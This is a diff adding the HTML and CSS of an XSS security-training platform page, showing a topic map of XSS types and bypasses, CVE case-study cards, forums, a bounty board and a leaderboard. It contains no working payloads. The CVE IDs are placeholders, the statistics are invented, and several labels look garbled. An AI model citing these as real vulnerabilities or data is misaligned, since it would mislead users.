@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Mastery Academy v3 | أكاديمية إتقان XSS</title>
+<meta name="description" content="أكاديمية XSS المتقدمة — Community Hub, CVE Studies, JS Debugger, DOM Viewer, Bug Bounty Simulation">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Fira+Code:wght@400;500;600&family=Outfit:wght@600;800;900&display=swap" rel="stylesheet">
+<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+<style>
+:root{
+  --bg:#030712;--bg2:#080d1a;--bg3:#0f172a;--card:#0b1120;
+  --border:#1e293b;--glow:#2d3f55;
+  --cyan:#06b6d4;--cyan-d:rgba(6,182,212,.1);
+  --orange:#f97316;--orange-d:rgba(249,115,22,.1);
+  --gold:#eab308;--gold-d:rgba(234,179,8,.08);
+  --green:#22c55e;--green-d:rgba(34,197,94,.08);
+  --red:#ef4444;--red-d:rgba(239,68,68,.08);
+  --purple:#a855f7;--purple-d:rgba(168,85,247,.08);
+  --blue:#3b82f6;
+  --text:#f1f5f9;--muted:#64748b;--subtle:#94a3b8;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Cairo',sans-serif;min-height:100vh;overflow-x:hidden}
+::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--glow);border-radius:99px}
+pre,code{font-family:'Fira Code',monospace!important}
+
+/* ── UTILS ── */
+.tag{display:inline-flex;align-items:center;gap:4px;padding:2px 9px;border-radius:99px;font-size:.72rem;font-weight:700;white-space:nowrap}
+.tag.cyan{background:var(--cyan-d);color:var(--cyan);border:1px solid rgba(6,182,212,.3)}
+.tag.orange{background:var(--orange-d);color:var(--orange);border:1px solid rgba(249,115,22,.3)}
+.tag.gold{background:var(--gold-d);color:var(--gold);border:1px solid rgba(234,179,8,.3)}
+.tag.green{background:var(--green-d);color:var(--green);border:1px solid rgba(34,197,94,.3)}
+.tag.red{background:var(--red-d);color:var(--red);border:1px solid rgba(239,68,68,.3)}
+.tag.purple{background:var(--purple-d);color:var(--purple);border:1px solid rgba(168,85,247,.3)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px}
+.card-title{font-size:.78rem;font-weight:800;color:var(--subtle);text-transform:uppercase;letter-spacing:.05em;margin-bottom:12px;display:flex;align-items:center;gap:7px}
+.mini-btn{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:4px 10px;color:var(--subtle);font-family:'Cairo',sans-serif;font-size:.72rem;font-weight:700;cursor:pointer;transition:all .2s}
+.mini-btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.mini-btn.active{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-d)}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.3)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes glowPulse{0%,100%{box-shadow:0 0 8px rgba(6,182,212,.3)}50%{box-shadow:0 0 20px rgba(6,182,212,.6)}}
+
+/* ═══════════════════════
+   TOP HEADER
+═══════════════════════ */
+.topbar{background:rgba(3,7,18,.95);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:10px 16px;position:sticky;top:0;z-index:300}
+.topbar-inner{max-width:1600px;margin:0 auto;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;flex-shrink:0}
+.brand-icon{font-size:2rem;line-height:1}
+.brand-text h1{font-size:1.05rem;font-weight:900;color:var(--text);margin:0}
+.brand-text p{font-size:.7rem;color:var(--muted)}
+.topbar-right{display:flex;align-items:center;gap:10px;margin-right:auto;flex-wrap:wrap}
+.xp-pill{display:flex;align-items:center;gap:6px;background:var(--bg3);border:1px solid var(--border);border-radius:99px;padding:4px 12px;font-size:.78rem;font-weight:700}
+.xp-dot{width:6px;height:6px;background:var(--gold);border-radius:50%;animation:pulse 2s infinite}
+.rank-badge{background:linear-gradient(135deg,var(--gold),var(--orange));color:#000;font-weight:900;font-size:.72rem;padding:4px 12px;border-radius:99px}
+.analytics-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 16px}
+.analytics-inner{max-width:1600px;margin:0 auto;display:flex;align-items:center;gap:20px;flex-wrap:wrap}
+.ana-item{display:flex;align-items:center;gap:5px;font-size:.72rem;color:var(--muted)}
+.ana-item strong{color:var(--text)}
+.ana-dot{width:5px;height:5px;border-radius:50%;animation:pulse 1.5s infinite}
+
+/* ═══════════════════════
+   MAIN GRID LAYOUT
+═══════════════════════ */
+.main-grid{display:grid;grid-template-columns:320px 1fr 280px;gap:14px;max-width:1600px;margin:0 auto;padding:14px 16px;align-items:start}
+@media(max-width:1200px){.main-grid{grid-template-columns:260px 1fr;}}
+@media(max-width:900px){.main-grid{grid-template-columns:1fr;}}
+
+/* ═══════════════════════
+   LEFT COLUMN
+═══════════════════════ */
+.left-col{display:flex;flex-direction:column;gap:12px}
+
+/* Knowledge Map */
+.km-wrap{overflow-x:auto;padding-bottom:8px}
+.km-tree{display:flex;align-items:center;gap:0;min-width:280px}
+.km-root{background:var(--orange-d);border:1.5px solid var(--orange);color:var(--orange);font-weight:800;font-size:.82rem;padding:8px 14px;border-radius:8px;cursor:pointer;transition:all .25s;white-space:nowrap}
+.km-branches{display:flex;flex-direction:column;gap:8px;margin-right:10px;position:relative}
+.km-branches::before{content:'';position:absolute;right:0;top:18px;bottom:18px;width:1px;background:var(--glow)}
+.km-row{display:flex;align-items:center;gap:0}
+.km-line{width:12px;height:1px;background:var(--glow);flex-shrink:0}
+.km-node{background:var(--bg3);border:1px solid var(--border);color:var(--subtle);font-size:.75rem;font-weight:700;padding:6px 11px;border-radius:6px;cursor:pointer;transition:all .2s;white-space:nowrap}
+.km-node:hover,.km-node.act{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-d)}
+.km-node.grn{border-color:var(--green);color:var(--green);background:var(--green-d)}
+.km-node.grn:hover{box-shadow:0 0 8px rgba(34,197,94,.2)}
+/* bypass sub-nodes */
+.km-bypass-group{display:flex;flex-direction:column;gap:4px;margin-right:8px}
+.km-bypass-node{background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.25);color:var(--purple);font-size:.7rem;font-weight:700;padding:4px 9px;border-radius:5px;cursor:pointer;transition:all .2s;white-space:nowrap}
+.km-bypass-node:hover{border-color:var(--purple);box-shadow:0 0 8px rgba(168,85,247,.2)}
+
+/* CVE Studies */
+.cve-list{display:flex;flex-direction:column;gap:6px}
+.cve-item{background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:8px 10px;cursor:pointer;transition:all .2s}
+.cve-item:hover{border-color:var(--red)}
+.cve-id{font-family:'Fira Code',monospace;font-size:.72rem;color:var(--red);font-weight:600;margin-bottom:2px}
+.cve-desc{font-size:.72rem;color:var(--muted);line-height:1.4}
+
+/* Community Hub */
+.forum-list{display:flex;flex-direction:column;gap:5px}
+.forum-item{display:flex;align-items:center;gap:7px;padding:6px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;font-size:.72rem;cursor:pointer;transition:all .2s}
+.forum-item:hover{border-color:var(--cyan)}
+.forum-item i{color:var(--cyan);font-size:.9rem;flex-shrink:0}
+.forum-hash{color:var(--cyan);font-weight:700;font-size:.7rem;font-family:monospace}
+
+/* Bug Bounty Board */
+.bb-board{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.bb-company{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:7px;text-align:center;font-size:.7rem;font-weight:700;cursor:pointer;transition:all .2s}
+.bb-company:hover{border-color:var(--gold);color:var(--gold)}
+.bb-company .logo{font-size:1.1rem;margin-bottom:2px}
+
+/* Job Listings */
+.job-list{display:flex;flex-direction:column;gap:5px}
+.job-item{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:7px 9px;cursor:pointer;transition:all .2s;font-size:.72rem}
+.job-item:hover{border-color:var(--green)}
+.job-title{color:var(--cyan);font-weight:700;margin-bottom:2px}
+.job-meta{color:var(--muted);font-size:.68rem}
+
+/* ═══════════════════════
+   CENTER COLUMN
+═══════════════════════ */
+.center-col{display:flex;flex-direction:column;gap:12px}
+
+/* Browser Simulator */
+.bsim{background:#070a13;border:1px solid var(--border);border-radius:10px;overflow:hidden}
+.bsim-titlebar{background:#0f172a;padding:8px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
+.sim-dot{width:10px;height:10px;border-radius:50%}
+.sim-dot.r{background:#ef4444}.sim-dot.y{background:#eab308}.sim-dot.g{background:#22c55e}
+.bsim-tab{display:flex;align-items:center;gap:6px;background:#1e293b;border:1px solid var(--border);border-radius:4px 4px 0 0;padding:4px 10px;font-size:.72rem;color:var(--subtle);margin-right:4px}
+.bsim-tab i{font-size:.8rem;color:var(--cyan)}
+.bsim-url{flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:3px 9px;font-family:'Fira Code',monospace;font-size:.68rem;color:var(--muted)}
+.sim-tabs{display:flex;gap:0;border-bottom:1px solid var(--border)}
+.sim-tab-btn{padding:7px 14px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);font-family:'Cairo',sans-serif;font-size:.75rem;font-weight:700;cursor:pointer;transition:all .2s}
+.sim-tab-btn.active{color:var(--cyan);border-bottom-color:var(--cyan)}
+.sim-body{padding:14px;display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:600px){.sim-body{grid-template-columns:1fr}}
+
+/* Request/Response panels */
+.rr-panel{background:var(--bg);border:1px solid var(--border);border-radius:7px;overflow:hidden}
+.rr-hdr{background:var(--bg3);padding:5px 10px;font-size:.68rem;font-weight:800;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:5px}
+.rr-body{padding:10px;font-family:'Fira Code',monospace;font-size:.68rem;color:var(--subtle);line-height:1.7;min-height:100px;max-height:180px;overflow-y:auto}
+.rr-body .key{color:var(--cyan)}.rr-body .val{color:var(--subtle)}.rr-body .payload{color:var(--red);font-weight:600}.rr-body .ok{color:var(--green)}
+
+/* Form Manipulator */
+.form-fields{display:flex;flex-direction:column;gap:6px;margin-top:8px}
+.ff-row{display:flex;align-items:center;gap:6px}
+.ff-label{font-size:.7rem;color:var(--muted);min-width:45px;font-weight:700}
+.ff-input{flex:1;background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:4px 8px;font-family:'Fira Code',monospace;font-size:.72rem;color:var(--text);outline:none;transition:border-color .2s}
+.ff-input:focus{border-color:var(--cyan)}
+.manip-btn{background:linear-gradient(135deg,var(--orange),var(--red));border:none;border-radius:5px;padding:4px 10px;color:#000;font-weight:800;font-size:.68rem;cursor:pointer;white-space:nowrap}
+
+/* DOM Tree + JS Debugger */
+.dtj-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:600px){.dtj-grid{grid-template-columns:1fr}}
+.dom-viewer{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.dv-hdr{background:var(--bg3);padding:6px 10px;font-size:.7rem;font-weight:800;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px}
+.dv-body{padding:10px;font-family:'Fira Code',monospace;font-size:.68rem}
+.dom-row{display:flex;align-items:center;justify-content:space-between;padding:4px 6px;border-radius:4px;cursor:pointer;transition:all .2s;margin-bottom:2px;border:1px solid transparent}
+.dom-row:hover{background:var(--cyan-d);border-color:var(--cyan)}
+.dom-row.highlight{background:var(--red-d);border-color:var(--red);animation:glowPulse 1.5s infinite}
+.dom-row.source{color:var(--orange)}
+.dom-row.sink{color:var(--red)}
+.dom-row.normal{color:var(--subtle)}
+.dom-count{background:var(--bg3);border-radius:3px;padding:1px 6px;font-size:.65rem;color:var(--muted)}
+.dom-count.hot{background:var(--red-d);color:var(--red)}
+
+/* JS Debugger */
+.jsd-body{padding:10px;font-family:'Fira Code',monospace;font-size:.68rem;max-height:180px;overflow-y:auto}
+.jsd-line{display:flex;gap:8px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.03);align-items:flex-start}
+.jsd-num{color:var(--muted);min-width:20px;text-align:right;flex-shrink:0;font-size:.65rem;line-height:1.5}
+.jsd-code{color:var(--subtle);line-height:1.5;flex:1}
+.jsd-code .kw{color:var(--purple)}.jsd-code .fn{color:var(--cyan)}.jsd-code .str{color:var(--green)}.jsd-code .cmm{color:var(--muted)}.jsd-code .exec{color:var(--red);font-weight:700;animation:blink 1s infinite}
+
+/* Lab Panels */
+.lab-panel{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.lab-hdr{background:var(--bg3);padding:8px 12px;font-size:.75rem;font-weight:800;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.lab-body{padding:12px;display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:500px){.lab-body{grid-template-columns:1fr}}
+.code-view{background:var(--bg);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.cv-hdr{background:var(--bg3);padding:4px 8px;font-size:.65rem;color:var(--muted);border-bottom:1px solid var(--border)}
+.cv-body{padding:8px;font-family:'Fira Code',monospace;font-size:.65rem;line-height:1.8;overflow-x:auto}
+.cv-body .hl{color:var(--red);font-weight:700}
+.cv-body .cm{color:var(--green)}
+.cv-body .tg{color:var(--cyan)}
+.cv-body .at{color:var(--gold)}
+
+/* Profile mockup */
+.profile-mock{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px}
+.profile-avatar{width:36px;height:36px;background:linear-gradient(135deg,var(--cyan),var(--blue));border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1rem;margin:0 auto 6px}
+.profile-name{text-align:center;font-weight:700;font-size:.78rem;margin-bottom:4px}
+.profile-bio-out{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:6px;font-family:'Fira Code',monospace;font-size:.65rem;min-height:28px;color:var(--subtle)}
+.pay-inp{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:5px 8px;font-family:'Fira Code',monospace;font-size:.68rem;color:var(--text);outline:none;margin-top:6px;transition:border-color .2s}
+.pay-inp:focus{border-color:var(--orange)}
+.test-btn{width:100%;margin-top:6px;background:linear-gradient(135deg,var(--orange),var(--red));border:none;border-radius:5px;padding:7px;color:#000;font-weight:800;font-family:'Cairo',sans-serif;font-size:.75rem;cursor:pointer;transition:all .25s}
+.test-btn:hover{opacity:.85;transform:translateY(-1px)}
+
+/* Hints Panel */
+.hints-panel{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px}
+.hint-row{display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:.7rem;cursor:pointer;transition:all .2s}
+.hint-row:hover{color:var(--gold)}
+.hint-row:last-child{border-bottom:none}
+.hint-num{color:var(--gold);font-weight:700;font-size:.65rem;width:55px;flex-shrink:0}
+
+/* Bug Bounty Sim */
+.bb-sim-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:500px){.bb-sim-grid{grid-template-columns:1fr}}
+.bb-form{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px}
+.bb-form-title{font-size:.7rem;font-weight:800;color:var(--cyan);margin-bottom:8px}
+.bb-field{margin-bottom:6px}
+.bb-field label{font-size:.65rem;color:var(--muted);font-weight:700;display:block;margin-bottom:2px}
+.bb-field input,.bb-field textarea{width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:4px 7px;font-family:'Fira Code',monospace;font-size:.65rem;color:var(--text);outline:none;resize:vertical;transition:border-color .2s}
+.bb-field input:focus,.bb-field textarea:focus{border-color:var(--cyan)}
+.bb-field textarea{min-height:50px}
+.bb-actions{display:flex;gap:6px;margin-top:8px}
+.bb-cancel{flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:5px;color:var(--muted);font-family:'Cairo',sans-serif;font-weight:700;font-size:.7rem;cursor:pointer}
+.bb-send{flex:2;background:linear-gradient(135deg,var(--cyan),var(--blue));border:none;border-radius:4px;padding:5px;color:#000;font-family:'Cairo',sans-serif;font-weight:800;font-size:.7rem;cursor:pointer}
+
+/* Feedback Panel */
+.feedback-panel{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px}
+.fb-title{font-size:.7rem;font-weight:800;margin-bottom:8px;color:var(--gold)}
+.fb-check{display:flex;align-items:flex-start;gap:6px;margin-bottom:5px;font-size:.7rem;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.fb-check:last-child{border-bottom:none}
+.fb-icon{flex-shrink:0;font-size:.85rem}
+
+/* ═══════════════════════
+   RIGHT COLUMN
+═══════════════════════ */
+.right-col{display:flex;flex-direction:column;gap:12px}
+
+/* Hacker Progress */
+.hp-level{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
+.hp-label{font-size:.75rem;font-weight:800}
+.hp-pct{font-size:.75rem;color:var(--cyan);font-weight:700}
+.hp-bar{background:var(--bg3);height:8px;border-radius:99px;overflow:hidden;margin-bottom:10px}
+.hp-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--blue));border-radius:99px;transition:width .5s}
+.hp-stat-row{display:flex;justify-content:space-between;font-size:.7rem;color:var(--muted);margin-bottom:10px}
+.hp-stat span{color:var(--text);font-weight:700}
+
+/* Achievement Badges */
+.badges-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:4px}
+.badge{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:6px 3px;text-align:center;cursor:pointer;transition:all .25s;position:relative}
+.badge.earned{border-color:var(--gold);background:var(--gold-d)}
+.badge.locked{opacity:.3}
+.badge-icon{font-size:1.1rem;display:block;margin-bottom:2px}
+.badge-name{font-size:.55rem;color:var(--muted);line-height:1.2}
+.badge.earned .badge-name{color:var(--gold)}
+
+/* Code Review Lab */
+.cr-snippet{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:8px;margin-bottom:8px;font-family:'Fira Code',monospace;font-size:.68rem;line-height:1.8;color:var(--subtle)}
+.cr-snippet .vuln{color:var(--red)}.cr-snippet .kw{color:var(--purple)}.cr-snippet .fn{color:var(--cyan)}
+.cr-options{display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
+.cr-opt{display:flex;align-items:center;gap:6px;padding:6px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;font-size:.72rem;cursor:pointer;transition:all .2s}
+.cr-opt:hover{border-color:var(--cyan)}
+.cr-opt.correct{border-color:var(--green);background:var(--green-d);color:var(--green)}
+.cr-opt.wrong{border-color:var(--red);background:var(--red-d);color:var(--red)}
+.cr-radio{width:12px;height:12px;border:1.5px solid var(--border);border-radius:50%;flex-shrink:0}
+.cr-opt.correct .cr-radio{background:var(--green);border-color:var(--green)}
+.cr-opt.wrong .cr-radio{background:var(--red);border-color:var(--red)}
+
+/* AI Mentor */
+.ai-mentor{background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.2);border-radius:8px;padding:10px;display:flex;gap:8px;align-items:flex-start}
+.ai-av{width:32px;height:32px;background:linear-gradient(135deg,var(--purple),var(--blue));border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0}
+.ai-text{font-size:.72rem;color:var(--subtle);line-height:1.6}
+.ai-text strong{color:var(--purple)}
+
+/* Reporting Academy */
+.rep-form{display:flex;flex-direction:column;gap:7px}
+.rep-field{display:flex;flex-direction:column;gap:3px}
+.rep-field label{font-size:.68rem;color:var(--muted);font-weight:700}
+.rep-field input,.rep-field textarea{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:5px 8px;font-family:'Cairo',sans-serif;font-size:.72rem;color:var(--text);outline:none;transition:border-color .2s}
+.rep-field input:focus,.rep-field textarea:focus{border-color:var(--cyan)}
+.rep-field textarea{min-height:55px;resize:vertical}
+.rep-checks{display:flex;flex-direction:column;gap:4px;margin:4px 0}
+.rep-check{display:flex;align-items:center;gap:6px;font-size:.7rem;cursor:pointer;padding:3px 0}
+.rep-check input[type=checkbox]{accent-color:var(--cyan);width:13px;height:13px}
+.rep-btns{display:flex;gap:6px;margin-top:4px}
+.rep-cancel{flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px;color:var(--muted);font-family:'Cairo',sans-serif;font-weight:700;font-size:.72rem;cursor:pointer}
+.rep-send{flex:2;background:linear-gradient(135deg,var(--cyan),var(--blue));border:none;border-radius:5px;padding:6px;color:#000;font-family:'Cairo',sans-serif;font-weight:900;font-size:.72rem;cursor:pointer}
+
+/* ═══════════════════════
+   LEADERBOARD
+═══════════════════════ */
+.lb-row{display:flex;align-items:center;gap:8px;padding:6px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;margin-bottom:4px;font-size:.72rem;transition:all .2s}
+.lb-row:hover{border-color:var(--cyan)}
+.lb-row.me{border-color:var(--orange);background:var(--orange-d);color:var(--orange)}
+.lb-num{font-family:'Outfit',sans-serif;font-weight:900;min-width:18px;text-align:center;font-size:.8rem}
+
+/* ═══════════════════════
+   OVERLAYS & NOTIFS
+═══════════════════════ */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--green);color:#000;font-weight:800;font-size:.82rem;padding:10px 22px;border-radius:99px;display:none;z-index:9999;box-shadow:0 8px 24px rgba(34,197,94,.4);white-space:nowrap}
+.ach-popup{position:fixed;top:80px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,var(--gold),var(--orange));color:#000;padding:12px 22px;border-radius:10px;font-weight:800;font-size:.85rem;display:none;z-index:9999;align-items:center;gap:8px;box-shadow:0 8px 28px rgba(234,179,8,.4)}
+.xp-notif{position:fixed;top:70px;right:20px;background:var(--bg3);border:1px solid var(--cyan);border-radius:99px;padding:8px 20px;color:var(--cyan);font-weight:800;font-size:.82rem;display:none;z-index:9999;box-shadow:0 0 16px rgba(6,182,212,.3)}
+</style>
+</head>
+<body>
+
+<!-- ══ TOP BAR ══ -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="#" class="brand">
+      <div class="brand-icon">🛡️</div>
+      <div class="brand-text">
+        <h1>أكاديمية إتقان XSS</h1>
+        <p>XSS Mastery Academy — Abdo Cyber Academy</p>
+      </div>
+    </a>
+    <div class="topbar-right">
+      <div class="xp-pill"><div class="xp-dot"></div><span id="nav-xp">0 XP</span></div>
+      <div class="rank-badge" id="nav-rank">🟢 Beginner</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ ANALYTICS BAR ══ -->
+<div class="analytics-bar">
+  <div class="analytics-inner">
+    <div class="ana-item"><div class="ana-dot" style="background:var(--green)"></div>Community Solutions: <strong id="ana-solutions">1.2k</strong></div>
+    <div class="ana-item"><div class="ana-dot" style="background:var(--gold)"></div>Average Bounty: <strong>$750</strong></div>
+    <div class="ana-item"><div class="ana-dot" style="background:var(--red)"></div>New CVEs Added: <strong>5</strong></div>
+    <div class="ana-item"><div class="ana-dot" style="background:var(--cyan)"></div>Online Hunters: <strong id="ana-online">47</strong></div>
+    <div class="ana-item" style="margin-right:auto;"><div class="ana-dot" style="background:var(--purple)"></div>Labs Solved Today: <strong id="ana-labs">318</strong></div>
+  </div>
+</div>
+
+<!-- ══ MAIN GRID ══ -->
+<div class="main-grid">
+
+  <!-- ════════════════════
+       LEFT COLUMN
+  ════════════════════ -->
+  <div class="left-col">
+
+    <!-- XSS Knowledge Map -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-sitemap' style="color:var(--cyan)"></i> XSS Knowledge Map</div>
+      <div class="km-wrap">
+        <div class="km-tree">
+          <div class="km-root" onclick="kmClick('root')">XSS</div>
+          <div class="km-branches" style="margin-right:10px;">
+            <!-- Reflected Row -->
+            <div class="km-row">
+              <div class="km-line"></div>
+              <div class="km-node act" onclick="kmClick('reflected')">Reflected</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('getpost')">GET/POST</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('filter')">Filter</div>
+              <div class="km-line"></div>
+              <!-- Bypass sub-group -->
+              <div class="km-bypass-group">
+                <div class="km-bypass-node" onclick="kmClick('flutter')">Flutter XSS</div>
+                <div class="km-bypass-node" onclick="kmClick('polyglot')">Polyglot Payloads</div>
+                <div class="km-bypass-node" onclick="kmClick('mutation')">Mutation XSS</div>
+                <div class="km-bypass-node" onclick="kmClick('clientfilter')">Client-Side Filters</div>
+              </div>
+            </div>
+            <!-- Bypass label -->
+            <div class="km-row" style="margin-right: 196px;">
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('bypass')" style="border-color:var(--purple);color:var(--purple);background:var(--purple-d);font-size:.68rem;">Advanced Bypass Techniques</div>
+            </div>
+            <!-- Stored Row -->
+            <div class="km-row">
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('stored')">Stored</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('database')">Database</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('adminview')">Admin View</div>
+              <div class="km-line"></div>
+              <div class="km-bypass-node" onclick="kmClick('clientside2')" style="font-size:.68rem;">Client-Side Filters</div>
+            </div>
+            <!-- DOM Row -->
+            <div class="km-row">
+              <div class="km-line"></div>
+              <div class="km-node grn" onclick="kmClick('dom')">DOM</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('javascript')">JavaScript</div>
+              <div class="km-line"></div>
+              <div class="km-node" onclick="kmClick('sourcesink')">Source/Sink</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="km-detail" style="margin-top:10px;display:none;background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:10px;font-size:.75rem;color:var(--subtle);line-height:1.6;animation:fadeIn .2s;"></div>
+    </div>
+
+    <!-- Real-World CVE Studies -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-bug' style="color:var(--red)"></i> Real-World CVE Case Studies</div>
+      <div class="cve-list">
+        <div class="cve-item" onclick="showCVE('2023-1')">
+          <div class="cve-id">CVE-2023-XXXX</div>
+          <div class="cve-desc">Reflected in popular app — GET parameter reflected without encoding in search result</div>
+        </div>
+        <div class="cve-item" onclick="showCVE('2023-2')">
+          <div class="cve-id">CVE-2023-XXXX</div>
+          <div class="cve-desc">Stored XSS in comments — payload executed for all viewers including admins</div>
+        </div>
+        <div class="cve-item" onclick="showCVE('2023-3')">
+          <div class="cve-id">CVE-2023-XXXX</div>
+          <div class="cve-desc">DOM XSS via postMessage — iframe sends untrusted data to innerHTML sink</div>
+        </div>
+        <div class="cve-item" onclick="showCVE('2023-4')">
+          <div class="cve-id">CVE-2023-XXXX</div>
+          <div class="cve-desc">Mutation XSS bypass — DOMPurify circumvented via foreign element parsing</div>
+        </div>
+        <div class="cve-item" onclick="showCVE('2023-5')">
+          <div class="cve-id">CVE-2023-XXXX</div>
+          <div class="cve-desc">Reflected Stored — content security misconfiguration leading to CSRF chain</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Community Hub -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-group' style="color:var(--gold)"></i> Community & Career Hub</div>
+      <div style="font-size:.68rem;color:var(--muted);font-weight:700;margin-bottom:6px;">Expert Fora (with top-rated posts)</div>
+      <div class="forum-list">
+        <div class="forum-item" onclick="forumClick()">
+          <i class='bx bx-message-dots'></i>
+          <div><div class="forum-hash">#XSS_Filter_Bypass_of_the_Month</div><div style="font-size:.65rem;color:var(--muted);margin-top:1px;">منتصر التحريري — 47 replies · 892 views</div></div>
+        </div>
+        <div class="forum-item" onclick="forumClick()">
+          <i class='bx bx-code-block'></i>
+          <div><div class="forum-hash">#Epannchrana_WAF_Bypass_Writeup</div><div style="font-size:.65rem;color:var(--muted);margin-top:1px;">Active Challenge — ends in 3 days</div></div>
+        </div>
+        <div class="forum-item" onclick="forumClick()">
+          <i class='bx bx-trophy'></i>
+          <div><div class="forum-hash">#DOM_XSS_Advanced_Techniques</div><div style="font-size:.65rem;color:var(--muted);margin-top:1px;">Featured · 156 upvotes</div></div>
+        </div>
+      </div>
+
+      <div style="font-size:.68rem;color:var(--muted);font-weight:700;margin:10px 0 6px;">Bug Bounty Program Board <span class="tag orange" style="margin-right:4px;">target bounties</span></div>
+      <div class="bb-board">
+        <div class="bb-company"><div class="logo">🏢</div>Company</div>
+        <div class="bb-company"><div class="logo">🦅</div>HackerOne</div>
+        <div class="bb-company"><div class="logo">🦊</div>GitLab</div>
+        <div class="bb-company"><div class="logo">🏆</div>Bountic</div>
+      </div>
+
+      <div style="font-size:.68rem;color:var(--muted);font-weight:700;margin:10px 0 6px;">Security Job Listings</div>
+      <div class="job-list">
+        <div class="job-item" onclick="jobClick()">
+          <div class="job-title">Security Job Listings — Application Security Engineer</div>
+          <div class="job-meta">تفتيش دخل المسلولي · Remote · $120k–$160k</div>
+        </div>
+        <div class="job-item" onclick="jobClick()">
+          <div class="job-title">Penetration Tester — Web Applications</div>
+          <div class="job-meta">2 days ago · Mid-Senior Level · Dubai</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Leaderboard -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-trophy' style="color:var(--gold)"></i> Top Hunters Leaderboard</div>
+      <div class="lb-row me">
+        <div class="lb-num">🥇</div>
+        <div style="flex:1"><div style="font-weight:800;">Abdo</div><div style="font-size:.65rem;">XSS Elite 👑</div></div>
+        <span id="lb-xp-me" class="tag orange">0 XP</span>
